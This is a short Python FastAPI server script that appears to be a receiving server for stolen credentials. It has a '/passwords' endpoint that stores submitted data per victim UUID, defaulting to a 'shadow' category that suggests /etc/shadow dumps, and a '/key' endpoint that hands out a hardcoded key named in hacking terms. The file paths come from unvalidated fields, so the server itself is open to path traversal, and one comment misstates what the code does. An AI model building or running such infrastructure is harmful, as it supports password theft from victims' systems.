import uvicorn
from fastapi import FastAPI, File, UploadFile
from pydantic import BaseModel
import os
import uuid as uuid_lib
from datetime import datetime
import shutil
import io
import logging

app = FastAPI()

# encryption key:
encryption_key = "LunaLovesHackingHellYeah"

logger = logging.getLogger('uvicorn.error')
logger.setLevel(logging.DEBUG)


# Pydantic model to accept the JSON structure with uuid and raw_file
class RequestData(BaseModel):
    uuid: str
    data: str  # assuming the raw_file will be a base64 encoded string
    kind: str

# Helper function to save the file
def save_file(uuid_str: str, raw_file_data: str, kind: str = "shadow"):
    # Create the directory if it doesn't exist
    directory = f'./files/{kind}/{uuid_str}'
    os.makedirs(directory, exist_ok=True)
    
    # Get the current timestamp for the filename
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    
    # Decode the base64 data
    file_data = io.BytesIO(raw_file_data.encode('utf-8'))
    
    # Save the file with timestamped name
    file_path = os.path.join(directory, f"{timestamp}.txt")
    with open(file_path, 'wb') as f:
        shutil.copyfileobj(file_data, f)
    return file_path

@app.post("/passwords")
async def handle_test(request_data: RequestData):
    # Retrieve uuid and raw_file from the request
    uuid_str = request_data.uuid
    data = request_data.data
    kind = request_data.kind

    # Save the file and generate the path
    file_path = save_file(uuid_str, data, kind=kind)
    return {"message": "File saved successfully", "file_path": file_path}

@app.get("/key")
async def get_key():
    return encryption_key

if __name__ == "__main__":
    uvicorn.run(app, port=10000)